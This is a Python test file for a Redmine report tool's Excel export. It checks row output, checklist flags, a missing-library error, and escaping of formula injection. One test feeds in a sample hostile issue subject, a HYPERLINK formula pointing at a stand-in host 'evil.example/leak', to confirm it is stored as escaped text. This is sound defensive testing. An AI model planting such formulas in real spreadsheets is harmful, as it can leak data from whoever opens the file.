"""엑셀(xlsx) 내보내기 테스트."""

from __future__ import annotations

import openpyxl
import pytest

from redmine_report.services import excel


def _load(stream):
    stream.seek(0)
    return openpyxl.load_workbook(stream)


def test_build_workbook_full_mode_writes_rows():
    cases = [
        {
            "id": 101,
            "subject": "로그인 실패",
            "result": {
                "cases": [
                    {
                        "priority": "P0",
                        "depth1": "회원",
                        "objective": "잘못된 비밀번호 입력 시 오류 문구 노출",
                        "evidence": "5회 실패 시 잠긴다",
                        "status": "pass",
                    }
                ]
            },
        }
    ]
    wb = _load(excel.build_workbook(cases, mode="full"))
    ws = wb.active
    assert ws["A1"].value == "이슈ID"
    assert ws["A2"].value == 101
    assert ws["J2"].value == "잘못된 비밀번호 입력 시 오류 문구 노출"


def test_build_workbook_checklist_mode_marks_missing_evidence():
    cases = [
        {
            "id": 5,
            "subject": "체크리스트",
            "result": {"checklist": [{"category": "기본", "text": "확인", "status": ""}]},
        }
    ]
    wb = _load(excel.build_workbook(cases, mode="checklist"))
    ws = wb.active
    assert "검수 필요" in ws["E2"].value


def test_build_workbook_neutralizes_formula_injection():
    """Redmine 이슈 제목이 '=' 로 시작해도 셀이 수식(f)이 아닌 텍스트(s)로 저장돼야 한다.

    openpyxl 은 문자열이 '=' 로 시작하면 자동으로 수식 셀로 인식한다.
    악의적인 이슈 제목("=HYPERLINK(...)" 등)이 파일을 여는 사람 PC에서
    그대로 실행되는 것을 막아야 한다(CSV/Excel Formula Injection).
    """
    cases = [
        {
            "id": 1,
            "subject": '=HYPERLINK("http://evil.example/leak","click")',
            "result": {"cases": [{"priority": "P0", "objective": "+1+1", "status": "pass"}]},
        }
    ]
    wb = _load(excel.build_workbook(cases, mode="full"))
    ws = wb.active

    subject_cell = ws["B2"]
    objective_cell = ws["J2"]

    assert subject_cell.data_type == "s"
    assert subject_cell.value.startswith("'=")
    assert objective_cell.data_type == "s"
    assert objective_cell.value.startswith("'+")


def test_build_workbook_without_openpyxl_raises(monkeypatch):
    monkeypatch.setattr(excel, "HAS_XLSX", False)
    with pytest.raises(excel.ExcelUnavailable):
        excel.build_workbook([], mode="full")
